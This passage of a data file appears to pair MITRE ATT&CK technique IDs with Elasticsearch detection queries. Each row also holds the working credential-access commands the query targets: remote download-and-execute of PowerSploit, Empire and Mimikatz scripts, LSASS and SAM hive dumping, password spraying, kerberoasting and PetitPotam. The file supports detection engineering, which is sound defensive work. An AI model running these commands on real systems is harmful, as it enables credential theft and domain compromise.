}",findstr /S cpassword %logonserver%\sysvol\*.xml,2,
T1558.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""Get-DomainUser""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"":{""CommandLine"": ""-PreauthNotRequired""}},
                        {""match"":{""CommandLine"": ""-Properties""}},
                        {""wildcard"":{""CommandLine"": ""PowerView*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose",没日志,
T1003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""gsecdump*""}},
                    {""match"": {""CommandLine"": ""-a""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",PathToAtomicsFolder\T1003\bin\gsecdump.exe -a,2,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""pypykatz*""}},
                    {""wildcard"": {""CommandLine"": ""lsa*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",pypykatz live lsa,2,
T1003.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""pypykatz*""}},
                    {""wildcard"": {""CommandLine"": ""registry*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",pypykatz live registry,2,
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""mimikatz*""}},
                        {""match"":{""CommandLine"": ""sekurlsa""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""*.DMP""}},
                        {""match"":{""CommandLine"": ""logonpasswords""}},
                        {""match"":{""CommandLine"": ""minidump""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","PathToAtomicsFolder\T1003.001\bin\mimikatz.exe ""sekurlsa::minidump %tmp%\lsass.DMP"" ""sekurlsa::logonpasswords full"" exit",2,
T1003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""totallylegit*""}},
                    {""wildcard"": {""CommandLine"": ""*.dmp""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",.\totallylegit.exe #{host.process.id} C:\Users\Public\creds.dmp,2,
T1110.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""hashcat*""}},
                        {""match"":{""CommandLine"": ""-r""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""*.rule""}},
                        {""wildcard"":{""CommandLine"": ""*.txt""}},
                        {""wildcard"":{""CommandLine"": ""*.lst""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cd %temp%\hashcat6\hashcat-6.1.1\hashcat.exe\.. 
&& %temp%\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule c5068b_sam.txt cab59f_password.lst",2,
T1110.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""Invoke-DomainPasswordSpray""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"":{""CommandLine"": ""-Password""}},
                        {""match"":{""CommandLine"": ""-Domain""}},
                        {""wildcard"":{""CommandLine"": ""*PasswordSpray*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); 
Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force",2,
T1110.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""Get-ADUser -LDAPFilter""}},
                        {""match_phrase"":{""CommandLine"": ""Select-Object -ExpandProperty""}},
                        {""wildcard"": {""CommandLine"": ""System.DirectoryServices.Protocols*""}},
                        {""wildcard"":{""CommandLine"": ""*NTLM""}},
                        {""match_phrase"":{""CommandLine"": ""Foreach-Object""}},
                        {""match"":{""CommandLine"": ""try""}},
                        {""wildcard"":{""CommandLine"": ""*.bind""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""System.Net.NetworkCredential""}},
                        {""match_phrase"": {""CommandLine"": ""Write-Host""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {;
   Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported"";
   exit 1; 
}; 
$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName; [System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null; 
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389); $DomainUsers | Foreach-Object {;
   $user = $_;
   $password = 'P@ssw0rd!';
   $credz = new-object System.Net.NetworkCredential($user, $password, ""$env:UserDnsDomain"");
   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);
   try {;
     Write-Host "" [-] Attempting ${password} on account ${user}."";
     $conn.bind();
     Write-Host "" [!] ${user}:${password} are valid credentials!"";
   } catch {;
     Write-Host $_.Exception.Message;
   }; 
}; 
Write-Host ""End of password spraying""",2,
T1187,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""PetitPotam*""}},
                    {""wildcard"": {""CommandLine"": ""*.*.*.*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","& ""$env:TEMP\PetitPotam.exe"" 10.0.0.3 10.0.0.2 1; 
Write-Host ""End of PetitPotam attack""",2,
T1003.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Import-Module""}},
                    {""match_phrase"": {""CommandLine"": ""Invoke-PowerDump""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (Test-Path ""$Env:Temp\PowerDump.ps1"") { ;
 } else {Invoke-Webrequest -Uri ""https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"" -UseBasicParsing -OutFile ""$Env:Temp\PowerDump.ps1""};  ;  
Write-Host ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" -fore green; 
Import-Module ""$Env:Temp\PowerDump.ps1""; 
Invoke-PowerDump",2,
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-Mimikatz""}},
                        {""match"":{""CommandLine"": ""-DumpCreds""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                     
                        {""wildcard"":{""CommandLine"": ""invoke-mimi*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module .\invoke-mimi.ps1;
Invoke-Mimikatz -DumpCreds

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadString(""https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1"");
iex $result; 
Invoke-Mimikatz -DumpCreds",2没日志（恶意软件）,
T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""findstr*""}},
                        {""match"": {""CommandLine"": ""/e""}}
                    ]
     }
    },
           {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": "".docx""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""dir*""}},
                        {""match"": {""CommandLine"": "".pgp""}},
                        {""match"": {""CommandLine"": "".gpg""}},
                        {""match"": {""CommandLine"": "".ppk""}},
                        {""match"": {""CommandLine"": "".p12""}},
                        {""match"": {""CommandLine"": "".pem""}},
                        {""match"": {""CommandLine"": "".pfx""}},
                        {""match"": {""CommandLine"": "".cer""}},
                        {""match"": {""CommandLine"": "".p7b""}},
                        {""match"": {""CommandLine"": "".asc""}},
                        {""match"": {""CommandLine"": "".key""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",dir c:\ /b /s .key | findstr /e .key,2,
T1003.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""reg save""}}
                    ]
     }
    }, 
{""bool"":{
     ""must_not"":[
                        {""wildcard"": {""CommandLine"": ""PsExec*""}},
                          {""wildcard"":{""CommandLine"": ""copy*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"":{""CommandLine"": ""HKLM\\sam""}},
                        {""match_phrase"":{""CommandLine"": ""HKLM\\system""}}, 
                        {""match_phrase"":{""CommandLine"": ""HKLM\\security""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg save HKLM\sam %temp%\sam 
&& reg save HKLM\system %temp%\system 
&& reg save HKLM\security %temp%\security",2,
T1558.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Add-Type""}},
                    {""match_phrase"": {""CommandLine"": ""System.IdentityModel.Tokens.KerberosRequestorSecurityToken""}},
                    {""match_phrase"":{""CommandLine"": ""New-Object""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Add-Type -AssemblyName System.IdentityModel; 
$ComputerFQDN=$env:LogonServer.trimStart('\') + ""."" + $env:UserDnsDomain; 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""HTTP/$ComputerFQDN""

Add-Type -AssemblyName System.IdentityModel; 
setspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }",2,
T1558.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Invoke-Kerberoast""}},
                    {""match"": {""CommandLine"": ""| fl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if((Get-CIMInstance -Class Win32_ComputerSystem) { ;
 } else {Write-Host Joining this computer to a domain must be done manually};  ;  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing); 
Invoke-Kerberoast | fl",2,
T1558.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""rubeus.exe""}},
                  
                    {""match"": {""CommandLine"": ""/outfile""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cmd.exe /c ""$Env:temp\rubeus.exe"" asreproast /outfile:""$Env:temp\rubeus_output.txt""",2,
T1558.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""rubeus*""}},
                    {""wildcard"":{""CommandLine"": ""kerberoast*""}},
                    {""match"": {""CommandLine"": ""/outfile""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","klist purge; cmd.exe /c ""$Env:temp\rubeus.exe"" kerberoast None /outfile:""$Env:temp\rubeus_output.txt""",2,
T1003.006,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""Get-ADReplAccount""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Get-ADReplAccount -All -Server,2,
T1040,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""New-NetEventSession""}},
                    {""match"": {""CommandLine"": ""-CaptureMode""}},
                    {""match_phrase"": {""CommandLine"": ""Add-NetEventProvider""}},
                    {""match"": {""CommandLine"": ""-SessionName""}},
                    {""match_phrase"": {""CommandLine"": ""Start-NetEventSession""}},
                    {""wildcard"": {""CommandLine"": ""*.etl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$path = ""$ENV:UserProfile\Desktop\pcap.etl"";
New-NetEventSession -Name ""PCAP"" -CaptureMode SaveToFile -LocalFilePath $path;
Add-NetEventProvider -Name ""Microsoft-Windows-TCPIP"" -SessionName ""PCAP"";
Start-NetEventSession -Name ""PCAP"";
Start-Sleep -s 60;
Stop-NetEventSession -Name ""PCAP"";
if (Test-Path $path) {
  echo $path;
  exit 0;
} else {
  echo ""Failed to generate PCAP file."";
  exit 1;
};",2,
T1003.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""System32\\config\\SAM""}},
                        {""match_phrase"": {""CommandLine"": ""get-wmiobject win32_shadowcopy""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"":{""CommandLine"": ""System.IO.File""}},
                        {""wildcard"":{""CommandLine"": ""certutil*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","write-host """"; 
$shadowlist = get-wmiobject win32_shadowcopy; 
$volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}; 
$maxvolume = ($volumenumbers | Sort-Object -Descending)[0]; 
$shadowpath = ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"" + $maxvolume + ""\Windows\System32\config\SAM""; 
$mydump = $ENV:temp + '\' + 'myhive'; 
[System.IO.File]::Copy($shadowpath , $mydump)

write-host """"; 
$shadowlist = get-wmiobject win32_shadowcopy; 
$volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}; 
$maxvolume = ($volumenumbers | Sort-Object -Descending)[0]; 
$shadowpath = ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"" + $maxvolume + ""\Windows\System32\config\SAM""; 
certutil -f -v -encodehex $shadowpath $ENV:temp\myhive 2",2,
T1003.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""esentutl*""}},
                {""match_phrase"": {""CommandLine"": ""system32/config/SAM""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM,2,
